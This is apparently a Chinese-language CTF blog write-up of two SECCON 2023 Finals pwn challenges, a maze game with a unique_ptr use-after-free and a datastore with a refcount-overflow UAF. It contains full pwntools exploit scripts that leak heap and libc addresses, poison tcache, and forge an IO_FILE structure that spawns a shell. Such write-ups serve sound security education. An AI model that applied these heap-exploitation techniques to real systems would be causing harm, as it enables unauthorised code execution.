---
date: 2025-02-09 10:29:05
layout: post
title: SECCON 2023 FINAL 部分 pwn 复现
subtitle: 
description: >-
    Let's go, Tokyo!
image: >-
  /assets/img/uploads/street.jpg
optimized_image: >-
  /assets/img/uploads/street.jpg
category: ctf
tags:
  - pwn
  - heap exploitation
author: rosayxy
paginate: true
---
## bomberman
这个走迷宫有点像24年 tsg ctf 的 [Baba pwn game](https://ctftime.org/writeup/38178) , 最终都是利用漏洞达到“破墙而出”的效果 ~      
### 漏洞
有一段   
```c++ 
   if (has_bomb() && _bomb.get()->timer()++ == 2 SEC) {
      _fire = new Fire(_bomb.get()->x(), _bomb.get()->y());
      delete _bomb.get(); // different from _bomb.release()
    }
```
其中 _bomb 是 unique_ptr 类型，直接这样 delete 的话 unique_ptr 不为空，从而可以产生 UAF    

### exploit
#### UAF
一开始被两个点卡住了：     
1. 如何控制它 getch() 的频率和我们发送的频率相同，看了当时队里当时 discord 的记录才发现可以一下输入一堆字符，让程序慢慢从 stdin 的缓冲区里面去读      
2. 因为它 getch() 中菜单的输入是键盘上 PAGE UP，PAGE DN 等四个箭头，所以找到这四个箭头对应的 python 字符有难度，比如说需要 getch() 返回的是 259，260，但是输入 chr(0x104) 返回的是 0xc4，试过 "\x1b[D" 这个也不行，问了 gpt 也没啥有用的回答，所以看了队里当时 discord 的记录，发现是发"\x1bOA" ~ "\x1bOD" 才行...现在回想起来可能是 google 的提示词不对，那玩意叫 arrow key... (流泪TT)    然后可以找到这个有用的 [stack_overflow 回答](https://stackoverflow.com/questions/22397289/finding-the-values-of-the-arrow-keys-in-python-why-are-they-triples)      
可以导致 player.bomb 赋值为我们 free 的 bomb 的代码   
```py
payload = right_chr + " " + left_chr + "a"*24 + right_chr + " "
```
#### breaking through walls
一开始的思路是传统的打 tcache poisoning 啥的，但是发现我们只能通过修改 player 的 x,y 和 bomb 的 timer 来写 fd，而 timer 可能需要自增 2**31 量级次，就显然不是这个思路    
所以就想如果再次把 player.bomb 给 drop 了的话，因为该 bomb 对应的 chunk 是 tcache 的第一个，所以 fd 高4字节是 0x5, `put_bomb` 中 `at(_bomb.get()->x(), _bomb.get()->y()) = OBJECT_BOMB;` 所以就把 (5,0) 的位置（原本这里是墙），放了一个炸弹，等它 release 之后就是 empty 的了，Player 就可以从中出来，然后在堆上随便找一个 "\x03" byte 站过去就行     
#### thoughts
如果是正式比赛的话 这样就算结束了，但是有两个思考：
1. 我们在 (5,0) 放上炸弹的时候，等它爆破结束会不会再次把我们之前 free 的 bomb chunk 再 free 一遍从而导致 tcache double free?    
不会，因为我们放 (5,0) bomb 的时候，先前的 bomb 的 fire 还在，所以等 fire 过了时间会 `_bomb.release();` 而这个不会 free _bomb 对应的堆内存（cppreference 上讲的不太清楚，这是问了 gpt 后的答案）     
2. 为什么在 freed bomb chunk 的 0x0 位置就有 "\x03"?     
这个是题目的一个 bonus，还是上面的那个情况，等 fire 过了时间会 `_bomb.release();`，之后 _bomb 就没人管 维持原样了，而此时 _bomb 的 timer 正好为3     
当然，这个条件不是必须的，用 search 可以看到堆上有其他固定为 "\x03" 的地方，让 player 穿墙后走过去应该也行      
### exp
```py
from pwn import*
import struct
context(os='linux',arch='amd64',log_level='debug')

# put_bomb 的时候 player->bomb() 被 move 到 Stage 的 _bomb，然后在图上标记出来
# pickup_bomb 的时候会 move Stage 的 _bomb 到 player->bomb()
# 在 create_fire 的时候没有 release _bomb 所以可能有一个 uaf 想一下怎么用吧
# set bomb 的原理是在 bomb 的上下左右分别去 burn 遇到 block 的话就烧掉
# timer: 每次 tick 会 timer ++ ; tick 和时钟同频  
# 每一轮先 tick 再 draw  

# 这个 timer 是通过一次 send 一堆来控制的！而非控制 sleep 的时间
p = process("./game")
# gdb.attach(p,'''
#            b *$rebase(0x361a)
#            b* $rebase(0x3699)
#            b* $rebase(0x3936)
#            b* $rebase(0x37e0)
#            b* $rebase(0x3f81)
#            ''')
# pause()
sleep(1)
# TODO 问这些是咋得到的
left_chr = "\x1bOD"
right_chr = "\x1bOC"
up_chr = "\x1bOA"
down_chr = "\x1bOB"

payload = right_chr + " " + left_chr + "a"*24 + right_chr + " "  # put bomb at (5,0) 现在在 (2,1)  
payload += " "+ "a"*30 +right_chr*3 + up_chr*4 + right_chr*2 # 从 (5,-1) 破墙 (7,-3)
sleep(0.1)
p.send(payload)
p.interactive()

```   

## DataStore2
卡了两次，一次是在 leak libc 的时候只想到了 double free， 还有一次是在最后堆重叠写 fd 的时候没想明白（     
### 漏洞
```c
typedef struct String {
	uint8_t ref;
	size_t size;
	char *content;
} str_t;
```
初赛有一个 Datastore1 的题，和那个题的源码 diff 了一下，发现这个 ref 显然可以溢出，从而可以 UAF 和 double free      

### leak
#### leak heap
直接用一个 UAF read 得到

#### leak libc
发现堆上有 unsorted bin，所以一开始的想法是像 [SU-msg_cfgd](/_posts/2025-01-04-writeups.md) 一样用 double free 搞堆上任意地址分配，然后 leak libc 之后再写 IO_list_all     
但是发现问题在于我们拿出来的 tcache chunk 无法改 fd 为堆地址，因为它 string 类型的 malloc 是用的 `scanf("%70m[^\n]%*c", &buf);`,这个看上去就是先 malloc 了 0x60 的堆空间（加上 header 是 0x70），然后 realloc 到真实输入的空间大小，而我们最大的输入量是 70，realloc 到一个 0x50 的块（加上 header），而其他2处 malloc，它 fd 的位置都无法控制到堆地址这么大的值...     
在看了 [mora sensei 的 writeup](https://moraprogramming.hateblo.jp/entry/2023/12/27/091339#Pwn-388-Datastore-2-2-solves) 后发现一个没想到利用的点：可以利用 count 为1的 array 类型把 free 掉的 str_t 申请出来，此时如下 data_t 类型的 v_uint 和我们 UAF 的 str_t 的 content 指针重合，然后改这个 v_uint 为 unsorted bin 的 fd 的位置，来 leak             
```c
typedef struct {
	type_t type;

	union {
		struct Array *p_arr;
		struct String *p_str;
		uint64_t v_uint;
		double v_float;
	};
} data_t;
```

### chunk overlapping
通过上述的方法，我们有了任意地址 free 原语，任意地址读原语，而我们现在想要一次任意地址写来改 IO_list_all 打 IO_FILE，首先想到的方法应该就是 tcache poisoning     
参考今年 qwb 的 chat-with-me，想去在两个 0x50 chunk 之间伪造 0x70 的chunk，利用 free 了这仨之后再把 0x50 chunk 申请出来，edit 0x70 fake chunk 的 fd      
试了一下，发现会在 realloc 的这个位置挂掉，而且因为 malloc 出来的第一个 chunk 对应地方会被设为 empty 所以无法解决：   
```c
  if ( -(__int64)round_down_oldsize < ptr_hdr || (ptr_hdr & 0xF) != 0 )
  {
    sub_A0CE0("realloc(): invalid pointer");
    goto LABEL_53;
  }
```
然后又去看了 writeup，才反应过来可以改那个 overlapped 的中间的 0x20 chunk 的 fd，感觉自己傻了hhhh（就像之前国赛复赛那个堆题，也是分割的方法想的不对.....）            

### IO_FILE
改了中间 0x20 chunk fd 之后，通过一个元素的 array 把 IO_list_all 所在块申请出来，改 IO_list_all 为一个堆地址，布置一个 fake_io_file 就行了     
这里的 fake_io_file 需要分成3个 string 发送，稍微有点点 dirty hhh     

### exp
```py
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
p = process("./chall_patched")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# dup enough strings
# create enough arrays
def update_array(idxs,size):
    p.recvuntil("> ")
    p.sendline("1")
    for i in idxs:
        p.recvuntil("index: ")
        p.sendline(i)
        p.recvuntil("> ")
        p.sendline("1")
    p.recvuntil("> ")
    p.sendline("a")
    p.recvuntil("size: ")
    p.sendline(str(size))
def update_string(idxs, content):
    p.recvuntil("> ")
    p.sendline("1")
    for i in idxs:
        p.recvuntil("index: ")
        p.sendline(i)
        p.recvuntil("> ")
        p.sendline("1")
    p.recvuntil("> ")
    p.sendline("v")
    p.recvuntil("value: ")
    p.send(content)

def copy(idxs,dst_idx):
    p.recvuntil("> ")
    p.sendline("1")
    for i in idxs[:-1]:
        p.recvuntil("index: ")
        p.sendline(i)
        p.recvuntil("> ")
        p.sendline("1")
    p.recvuntil("index: ")
    p.sendline(idxs[-1])
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("dest index: ")
    p.sendline(dst_idx)

def delete(idxs):
    p.recvuntil("> ")
    p.sendline("1")
    for i in idxs[:-1]:
        p.recvuntil("index: ")
        p.sendline(i)
        p.recvuntil("> ")
        p.sendline("1")
    p.recvuntil("index: ")
    p.sendline(idxs[-1])
    p.recvuntil("> ")
    p.sendline("2")

def list_array():
    p.recvuntil("> ")
    p.sendline("2")

p.recvuntil("> ")
p.sendline("1")
p.recvuntil("> ")
p.sendline("a")
p.recvuntil("size: ")
p.sendline("8")

# alloc some chunks for fastbin
update_array(["07"],8)
for i in range(8):
    update_string(["07","0"+str(i)],"b"*0x40+"\n")

update_array(["00"],8)
update_array(["00","00"],8)
update_string(["00","00","00"],b"a"*70+b"\n")
for i in range(7):
    copy(["00","00","00"],"0"+str(i+1))
for i in range(7):
    copy(["00","00"],"0"+str(i+1))
for i in range(4):
    copy(["00"],"0"+str(i+1))

# gdb.attach(p,'''
# b *$rebase(0x193f)
# b* $rebase(0x186c) 
#            ''')
# pause()
for i in range(7):
    delete(["07","0"+str(i+1)])
delete(["01"])
list_array()
# leak heap base
p.recvuntil("[00] <S> ")
heap_base = u64(p.recv(5).ljust(8,b"\x00"))*0x1000
print(hex(heap_base))
# 把 我们之前 str_t 的 chunk 当成 array_t 申请出来并且写东西
update_array(["01"],1)
update_string(["01","00"],str(heap_base + 0x11d0)+"\n")
list_array()
p.recvuntil("[00] <S> ")
libc_leak = u64(p.recv(6).ljust(8,b"\x00")) # TODO
print(hex(libc_leak))
libc_base = libc_leak - 0x21ace0
print(hex(libc_base))
# 在某个堆空间中构造 fake chunk 然后用任意地址 free 来搞
# 构造 0x70 的 fake_chunk 覆盖我们的已经 free 的某个 chunk 来实现改 fd
# 先把堆块占上

update_array(["07","00"],8)
update_array(["07","01"],1)
update_array(["07","02"],1)
update_array(["07","03"],1)
for i in range(4):
    copy(["07","01"],"0"+str(i+4))
update_array(["07","00","00"],8)
update_array(["07","00","01"],1)
for i in range(3):
    copy(["07","00","01"],"0"+str(i+2))
# start chunk faking
update_string(["07","00","00","00"],b"a"*0x28+p64(0x71)+b"r"*0x10+b"\n")
update_string(["07","00","00","01"],b"m"*0x28+p64(0x31)+b"a"*0x10+b"\n")
# assemble house of apple2
payload_addr = heap_base + 0x22b8 # TODO
payload = b"a"*0x8+b"  sh;".ljust(0x20,b"\x00")+p64(1)+p64(2)+p64(0)
system = libc_base + libc.sym["system"]
# 从 0x68 开始
payload2 = p64(system)
payload2 = payload2.ljust(0x20,b"\x00")
payload2 += p64(payload_addr+0xe0) # 0x88
payload2 = payload2.ljust(0x38,b"\x00")
payload2 += p64(payload_addr) # 0xa0
# 从 0xd8 开始
payload3 = p64(0x2170c0+libc_base)+p64(payload_addr)+p64(0)+p64(payload_addr+0x200)
update_string(["07","00","00","02"],payload+b"\n")
update_string(["07","00","00","03"],payload2+b"\n")
update_string(["07","00","00","04"],payload3+b"\n")
# gdb.attach(p)
# pause()
update_string(["01","00"],str(heap_base + 0x2200)+"\n")
delete(["00","00","00"])
delete(["07","00","00","00"])
delete(["07","00","00","01"])
io_list_all = libc_base + libc.sym["_IO_list_all"]
update_string(["07","00","00","00"],b"a"*0x18+p64(0x21)+p64((io_list_all - 0x10)^((heap_base+0x2200)//0x1000))+p64(0)*2+p64(0x50)+b"\n")

copy(["07","00","01"],"05")
copy(["07","00","01"],"06")
copy(["07","00","01"],"07")
update_string(["07","00","07","00"],str(payload_addr)+"\n") # TODO
p.recvuntil("> ")
p.send("\n")
p.interactive()
```

### 总结
总结就是，一定要找准所有 malloc 和 free 的位置，以及 UAF 不一定是像经典的情况下有直接改 fd 和 bk 的机会，申请出来该 UAF chunk 为别的结构体从而顺势改 fd/bk 也是合理的操作 ~     
